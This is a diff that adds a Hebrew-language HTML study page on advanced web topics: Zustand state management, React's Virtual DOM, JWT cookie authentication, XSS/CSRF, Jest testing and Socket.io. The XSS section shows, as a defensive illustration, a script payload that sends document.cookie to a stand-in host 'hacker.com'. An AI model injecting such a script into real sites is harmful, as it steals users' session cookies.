@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🚀 נושאים מתקדמים ותרשימי ארכיטקטורה</title>
+<style>
+  /* === Diagram Styles === */
+  .css-diagram { background: rgba(0,0,0,0.4); padding: 20px; border-radius: 12px; margin: 20px 0; border: 1px solid rgba(78,205,196,0.3); display: flex; flex-direction: column; align-items: center; gap: 10px; }
+  .css-diagram .box { padding: 10px 20px; border-radius: 8px; font-weight: bold; width: 220px; text-align: center; border: 2px solid rgba(255,255,255,0.2); }
+  .css-diagram .arrow { color: #a0a0a0; font-size: 0.9em; margin: 5px 0; }
+  .css-diagram .row { display: flex; align-items: center; gap: 15px; margin: 10px 0; width: 100%; justify-content: center; }
+  .css-diagram .arrow-right { color: #a0a0a0; font-size: 0.9em; width: 200px; text-align: center; }
+  .box.ui { background: #3b82f6; color: white; }
+  .box.action { background: #10b981; color: white; }
+  .box.logic { background: #f59e0b; color: white; }
+  .box.store { background: #6366f1; color: white; }
+  .box.state { background: #ec4899; color: white; }
+  .box.react { background: #0ea5e9; color: white; }
+  .box.diff { background: #eab308; color: black; }
+  .box.realdom { background: #22c55e; color: white; }
+  .step { background: rgba(255,255,255,0.05); padding: 12px 20px; border-radius: 8px; width: 100%; text-align: right; display: flex; align-items: center; gap: 15px; border: 1px solid rgba(255,255,255,0.1); }
+  .step-num { background: #ffd93d; color: #000; width: 25px; height: 25px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; flex-shrink: 0; }
+  .step.highlight { border-color: #ff6b6b; background: rgba(255,107,107,0.1); }
+  .step.highlight .step-num { background: #ff6b6b; color: white; }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body { font-family: 'Segoe UI', system-ui, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); background-attachment: fixed; color: #e0e0e0; line-height: 1.7; min-height: 100vh; padding: 20px; }
+  .container { max-width: 1300px; margin: 0 auto; }
+  header { text-align: center; padding: 40px 20px; background: linear-gradient(135deg, #f59e0b 0%, #d97706 50%, #b45309 100%); border-radius: 20px; margin-bottom: 30px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }
+  header h1 { font-size: 2.5em; color: white; margin-bottom: 10px; }
+  header p { color: rgba(255,255,255,0.95); font-size: 1.2em; }
+  .back-link { display: inline-block; margin-bottom: 20px; color: #ffd93d; text-decoration: none; padding: 10px 20px; background: rgba(255,217,61,0.1); border-radius: 8px; transition: all 0.3s ease; }
+  .back-link:hover { background: rgba(255,217,61,0.25); }
+  .toc { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 15px; padding: 25px; margin-bottom: 30px; }
+  .toc h2 { color: #4ecdc4; margin-bottom: 20px; }
+  .toc-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 10px; }
+  .toc a { color: #ffd93d; text-decoration: none; padding: 10px 14px; background: rgba(255,217,61,0.1); border-radius: 8px; transition: all 0.3s ease; border: 1px solid rgba(255,217,61,0.2); }
+  .toc a:hover { background: rgba(255,217,61,0.25); transform: translateY(-2px); }
+  section { background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08); border-radius: 15px; padding: 35px; margin-bottom: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); scroll-margin-top: 30px; }
+  section h2 { color: #4ecdc4; font-size: 2em; margin-bottom: 20px; padding-bottom: 12px; border-bottom: 3px solid rgba(78,205,196,0.3); }
+  section h3 { color: #ffd93d; margin: 25px 0 15px; font-size: 1.4em; padding-right: 15px; border-right: 4px solid #ffd93d; }
+  .mermaid-wrapper { background: rgba(0,0,0,0.4); padding: 20px; border-radius: 12px; margin: 20px 0; overflow-x: auto; border: 1px solid rgba(78,205,196,0.3); text-align: center; }
+  .level-box { padding: 20px; border-radius: 12px; margin: 15px 0; border-right: 5px solid; }
+  .programmer { background: linear-gradient(135deg, rgba(102,126,234,0.15), rgba(118,75,162,0.15)); border-color: #667eea; }
+  .programmer::before { content: "👨‍💻 רמת מתכנת"; display: inline-block; background: #667eea; color: white; padding: 4px 12px; border-radius: 20px; font-size: 0.9em; margin-bottom: 10px; font-weight: bold; }
+  .architect { background: linear-gradient(135deg, rgba(220,38,38,0.15), rgba(153,27,27,0.15)); border-color: #ef4444; }
+  .architect::before { content: "🏗️ רמת ארכיטקט"; display: inline-block; background: #ef4444; color: white; padding: 4px 12px; border-radius: 20px; font-size: 0.9em; margin-bottom: 10px; font-weight: bold; }
+  .code-block { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 18px 20px; font-family: 'Consolas', monospace; direction: ltr; text-align: left; overflow-x: auto; margin: 15px 0; color: #e6edf3; font-size: 0.95em; line-height: 1.6; white-space: pre; }
+  code.inline { background: rgba(78,205,196,0.15); color: #4ecdc4; padding: 2px 8px; border-radius: 4px; font-family: 'Consolas', monospace; font-size: 0.95em; direction: ltr; display: inline-block; }
+  .important { background: rgba(255,107,107,0.15); border-right: 4px solid #ff6b6b; padding: 15px 20px; border-radius: 8px; margin: 15px 0; }
+  .important::before { content: "💡 "; font-size: 1.3em; }
+</style>
+  <link rel="stylesheet" href="light-mode.css">
+  <link rel="stylesheet" href="print-mobile.css">
+</head>
+<body>
+
+<div class="container">
+  <a href="00_dashboard.html" class="back-link">← חזרה לדשבורד</a>
+
+  <header>
+    <h1>🚀 נושאים מתקדמים ותרשימי ארכיטקטורה</h1>
+    <p>Testing · State Management · Security · Real-Time</p>
+  </header>
+
+  <nav class="toc">
+    <h2>📚 מה נלמד כאן?</h2>
+    <div class="toc-grid">
+      <a href="#state">1. ניהול State מתקדם (Redux/Zustand)</a>
+      <a href="#vdom">2. תרשים Virtual DOM ו-Reconciliation</a>
+      <a href="#authflow">3. זרימת אימות (JWT vs Cookies)</a>
+      <a href="#security">4. אבטחת מידע (XSS, CSRF)</a>
+      <a href="#testing">5. בדיקות תוכנה (Testing 101)</a>
+      <a href="#realtime">6. תקשורת זמן אמת (WebSockets)</a>
+    </div>
+  </nav>
+
+  <!-- ============ 1. STATE MANAGEMENT ============ -->
+  <section id="state">
+    <h2>1️⃣ ניהול State מתקדם (Redux / Zustand)</h2>
+    <div class="level-box programmer">
+      <p>כשהאפליקציה גדלה, להעביר Props בין עשרות קומפוננטות הופך לסיוט (Prop Drilling). למרות ש-Context API פותר חלק מהבעיה, הוא גורם לרינדור מחדש (Re-render) של כל העץ בכל שינוי קטן. פה נכנסים לתמונה Redux ו-Zustand שמאפשרים עדכונים ספציפיים.</p>
+    </div>
+
+    <h3>זרימת מידע חד-כיוונית (Unidirectional Data Flow)</h3>
+    <div class="css-diagram">
+      <div class="box ui">UI / Component</div>
+      <div class="arrow">↓ Dispatch(Action)</div>
+      <div class="box action">Action (Type & Payload)</div>
+      <div class="arrow">↓</div>
+      <div class="box logic">Reducer / Logic</div>
+      <div class="arrow">↓ Updates</div>
+      <div class="box store">Global Store</div>
+      <div class="arrow">↓ Selects(State)</div>
+      <div class="box ui">UI / Component</div>
+    </div>
+    
+    <h3>דוגמת קוד: Zustand (הדרך המודרנית והקלה)</h3>
+    
+  <details class="custom-details code-details">
+    <summary>💻 הצג קוד דוגמה</summary>
+    <div class="details-content code-block" style="margin-top:10px; direction:ltr; text-align:left;">import { create } from 'zustand';
+
+// 1. יצירת ה-Store
+const useBearStore = create((set) => ({
+  bears: 0,
+  increasePopulation: () => set((state) => ({ bears: state.bears + 1 })),
+  removeAllBears: () => set({ bears: 0 }),
+}));
+
+// 2. שימוש בקומפוננטה
+function BearCounter() {
+  // שולפים רק מה שצריך - לא יהיה רינדור אם דברים אחרים משתנים!
+  const bears = useBearStore((state) => state.bears);
+  return &lt;h1&gt;{bears} bears around here...&lt;/h1&gt;
+}
+
+function Controls() {
+  const increasePopulation = useBearStore((state) => state.increasePopulation);
+  return &lt;button onClick={increasePopulation}&gt;Add bear&lt;/button&gt;
+}</div>
+  </details>
+  
+  </section>
+
+  <!-- ============ 2. VIRTUAL DOM ============ -->
+  <section id="vdom">
+    <h2>2️⃣ איך React באמת עובד? (Virtual DOM)</h2>
+    <div class="level-box architect">
+      <p>ה-DOM של הדפדפן הוא אובייקט איטי. בכל פעם שמשנים בו משהו, הדפדפן צריך לחשב מחדש מיקומים ועיצובים (Reflow & Repaint). React המציאה את ה-Virtual DOM: העתק קל-משקל בזיכרון של ה-DOM האמיתי.</p>
+    </div>
+
+    <h3>תהליך ה-Reconciliation (Diffing Algorithm)</h3>
+    <div class="css-diagram">
+      <div class="row"><div class="box state">State / Props</div> <div class="arrow-right">→ משתנה (לדוגמה setCounter) →</div> <div class="box react">React (VDOM)</div></div>
+      <div class="row"><div class="box react">React</div> <div class="arrow-right">→ מרנדר Virtual DOM חדש →</div> <div class="box diff">Diffing Engine</div></div>
+      <div class="row"><div class="box diff">Diffing Engine</div> <div class="arrow-right">→ מוצא שינוי מדויק (למשל טקסט) →</div> <div class="box realdom">Real DOM</div></div>
+      <p style="text-align:center; color:#4ecdc4; margin-top:10px; font-weight:bold;">💡 מצייר רק את מה שהשתנה בפועל!</p>
+    </div>
+    
+    <div class="important">
+      <strong>שאלת ראיונות חובה:</strong> למה צריך `key` כשהופכים מערך לקומפוננטות?
+      תשובה: כדי לעזור לאלגוריתם ה-Diffing של React להבין אילו איברים נוספו, הוסרו או זזו, מבלי לרנדר מחדש את כל הרשימה.
+    </div>
+  </section>
+
+  <!-- ============ 3. AUTH FLOW ============ -->
+  <section id="authflow">
+    <h2>3️⃣ זרימת אימות (JWT vs Cookies)</h2>
+    
+    <h3>איך עובד אימות מודרני מבוסס JWT ו-HttpOnly Cookie?</h3>
+    <div class="css-diagram">
+      <div class="step">
+        <span class="step-num">1</span> <strong>Browser</strong> <span>→ POST /login {email, password} →</span> <strong>API</strong>
+      </div>
+      <div class="step">
+        <span class="step-num">2</span> <strong>API</strong> <span>→ מאמת מול DB ומייצר JWT →</span> <strong>DB</strong>
+      </div>
+      <div class="step">
+        <span class="step-num">3</span> <strong>API</strong> <span>→ מחזיר עוגיה: Set-Cookie: token=...; HttpOnly →</span> <strong>Browser</strong>
+      </div>
+      <div class="step highlight">
+        <span class="step-num">!</span> <span style="color:#ff6b6b; font-weight:bold;">ה-Token שמור בדפדפן, קוד JS לא יכול לגשת אליו (הגנת HttpOnly)</span>
+      </div>
+      <div class="step">
+        <span class="step-num">4</span> <strong>Browser</strong> <span>→ GET /api/private-data (עוגיה מצורפת אוטומטית) →</span> <strong>API</strong>
+      </div>
+      <div class="step">
+        <span class="step-num">5</span> <strong>API</strong> <span>→ מוודא JWT ומחזיר נתונים פרטיים →</span> <strong>Browser</strong>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 4. SECURITY ============ -->
+  <section id="security">
+    <h2>4️⃣ אבטחת מידע למפתחי ווב (XSS & CSRF)</h2>
+    
+    <h3>1. XSS (Cross-Site Scripting)</h3>
+    <p>התוקף מזריק קוד זדוני (לרוב JS) לתוך האתר שלנו, והקוד רץ בדפדפנים של משתמשים אחרים.</p>
+    
+  <details class="custom-details code-details">
+    <summary>💻 הצג קוד דוגמה</summary>
+    <div class="details-content code-block" style="margin-top:10px; direction:ltr; text-align:left;">// משתמש מכניס בתגובה לפוסט:
+&lt;script&gt;
+  fetch('https://hacker.com/steal?cookie=' + document.cookie)
+&lt;/script&gt;
+
+// איך מונעים ב-React?
+// React מגן אוטומטית כי הוא עושה Escaping לטקסט!
+// אבל אסור להשתמש בזה לעולם:
+&lt;div dangerouslySetInnerHTML={{ __html: userInput }} /&gt; ❌</div>
+  </details>
+  
+
+    <h3>2. CSRF (Cross-Site Request Forgery)</h3>
+    <p>התוקף גורם לדפדפן של משתמש מחובר לשלוח בקשה זדונית לאתר שלנו (כי הדפדפן שולח עוגיות אוטומטית).</p>
+    <p><strong>פתרון:</strong> הגדרת <code class="inline">SameSite: 'Strict'</code> בעוגיות, ושימוש ב-CSRF Tokens.</p>
+  </section>
+
+  <!-- ============ 5. TESTING ============ -->
+  <section id="testing">
+    <h2>5️⃣ בדיקות תוכנה (Testing 101)</h2>
+    <div class="table-wrapper">
+      <table>
+        <thead><tr><th>סוג בדיקה</th><th>מה בודקים?</th><th>כלים פופולריים</th></tr></thead>
+        <tbody>
+          <tr><td>Unit Tests</td><td>פונקציה בודדת או רכיב ספציפי במנותק (לדוגמה: פונקציית חיבור)</td><td>Jest, Vitest</td></tr>
+          <tr><td>Integration Tests</td><td>כמה רכיבים יחד (למשל: האם לחיצה על כפתור מעדכנת את ה-Context)</td><td>React Testing Library</td></tr>
+          <tr><td>End-to-End (E2E)</td><td>זרימת משתמש מלאה מהדפדפן כמו משתמש אמיתי (לחיצה על Login, בדיקה שניווטנו דף)</td><td>Cypress, Playwright</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    
+  <details class="custom-details code-details">
+    <summary>💻 הצג קוד דוגמה</summary>
+    <div class="details-content code-block" style="margin-top:10px; direction:ltr; text-align:left;">// דוגמת Unit Test פשוטה עם Jest
+function add(a, b) {
+  return a + b;
+}
+
+test('adds 1 + 2 to equal 3', () => {
+  expect(add(1, 2)).toBe(3);
+});</div>
+  </details>
+  
+  </section>
+
+  <!-- ============ 5b. TESTING EXPANDED ============ -->
+  <section id="testing-advanced">
+    <h2>5️⃣ בדיקות — Jest בפועל</h2>
+    <h3>Mock Functions ו-Spy</h3>
+    <div class="code-block">// jest.fn() — יצירת mock
+const mockFn = jest.fn();
+mockFn('hello');
+expect(mockFn).toHaveBeenCalledWith('hello');
+expect(mockFn).toHaveBeenCalledTimes(1);
+
+// Mock module שלם
+jest.mock('../api', () => ({
+  fetchUser: jest.fn().mockResolvedValue({ id: 1, name: 'Tal' })
+}));</div>
+
+    <h3>beforeEach / afterEach — Setup &amp; Cleanup</h3>
+    <div class="code-block">describe('UserService', () => {
+  let db;
+
+  beforeEach(() => {
+    db = createTestDB(); // אתחול לפני כל test
+  });
+
+  afterEach(() => {
+    db.close(); // ניקוי אחרי כל test
+  });
+
+  test('creates user', async () => {
+    const user = await db.createUser({ name: 'Tal' });
+    expect(user.id).toBeDefined();
+    expect(user.name).toBe('Tal');
+  });
+});</div>
+
+    <h3>toBe vs toEqual — מתי להשתמש?</h3>
+    <div class="code-block">// toBe — השוואת primitive / reference
+expect(1 + 1).toBe(2);         // ✅
+expect({a:1}).toBe({a:1});      // ❌ reference שונה!
+
+// toEqual — השוואת ערך עמוקה
+expect({a:1}).toEqual({a:1});   // ✅ deep equal
+expect([1,2]).toEqual([1,2]);   // ✅</div>
+
+    <div class="important">
+      <strong>כלל זהב:</strong> tests טובים בודקים behavior, לא implementation. אם שינית את הקוד הפנימי בלי לשנות behavior — ה-test לא אמור להישבר.
+    </div>
+  </section>
+
+  <!-- ============ 6. WEBSOCKETS ============ -->
+  <section id="realtime">
+    <h2>6️⃣ תקשורת זמן אמת — WebSockets</h2>
+    <div class="level-box programmer">
+      <p>HTTP הוא one-shot — client שולח request, server עונה וסוגר. לצ'אט/notifications/gaming צריך חיבור מתמשך דו-כיווני — WebSocket.</p>
+    </div>
+
+    <h3>השוואה: HTTP vs WebSocket</h3>
+    <div class="css-diagram">
+      <div class="row">
+        <div class="box ui" style="min-width:120px;">HTTP</div>
+        <div class="arrow-right">Client שולח → Server עונה → חיבור נסגר</div>
+      </div>
+      <div class="row">
+        <div class="box action" style="min-width:120px;">WebSocket</div>
+        <div class="arrow-right">Handshake → חיבור פתוח → שניהם שולחים מתי שרוצים</div>
+      </div>
+    </div>
+
+    <h3>Server — Node.js + Socket.io</h3>
+    <div class="code-block">const io = require('socket.io')(server);
+
+io.on('connection', (socket) => {
+  console.log('user connected:', socket.id);
+
+  socket.on('chat-message', (msg) => {
+    // שלח לכולם חוץ מהשולח
+    socket.broadcast.emit('chat-message', msg);
+  });
+
+  socket.on('disconnect', () => {
+    console.log('user disconnected');
+  });
+});</div>
+
+    <h3>Client — React + Socket.io</h3>
+    <div class="code-block">import { useEffect, useState } from 'react';
+import io from 'socket.io-client';
+
+const socket = io('http://localhost:3000');
+
+function Chat() {
+  const [messages, setMessages] = useState([]);
+
+  useEffect(() => {
+    socket.on('chat-message', (msg) => {
+      setMessages(prev => [...prev, msg]);
+    });
+    // cleanup — חובה!
+    return () => socket.off('chat-message');
+  }, []);
+
+  const sendMessage = (text) => {
+    socket.emit('chat-message', text);
+  };
+
+  return (/* JSX */);
+}</div>
+
+    <div class="important">
+      <strong>שאלה נפוצה במבחן:</strong> מה ההבדל בין WebSocket ל-Long Polling?<br>
+      Long Polling = client שולח request, server מחזיק אותו פתוח עד שיש חדשות — פחות יעיל.
+      WebSocket = חיבור TCP מתמשך אמיתי — הרבה יותר יעיל.
+    </div>
+  </section>
+
+</div>
+<script src="theme-toggle.js"></script>
+<script src="breadcrumbs.js"></script>
+<script src="lightbox.js"></script>
+<script src="sandbox.js"></script>
+  <script src="sidebar.js"></script>
+<script src="progress-engine.js"></script>
+</body>
+</html>
